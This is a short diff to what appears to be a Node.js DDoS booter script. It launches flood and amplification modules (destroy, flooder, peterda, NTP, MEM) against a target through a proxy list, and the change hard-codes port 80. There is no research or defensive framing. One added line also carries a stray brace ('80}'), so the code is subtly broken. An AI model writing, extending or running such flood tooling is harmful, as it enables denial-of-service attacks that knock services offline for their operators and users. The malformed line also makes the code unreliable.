@@ -389,8 +389,8 @@ const MEM = path.join(__dirname, `MEM`);
 	exec(`node ${destroy} ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${flooder} ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${peterda} ${target} ${duration} 100 100 proxy.txt`)
-	exec(`node ${NTP} ${target} ${duration} ${port} 1000`)
-	exec(`node ${MEM} ${target} ${duration} ${port} 1000`)
+	exec(`node ${NTP} ${target} ${duration} 80 1000`)
+	exec(`node ${MEM} ${target} ${duration} 80} 1000`)
 	  
 	  
           sigma()
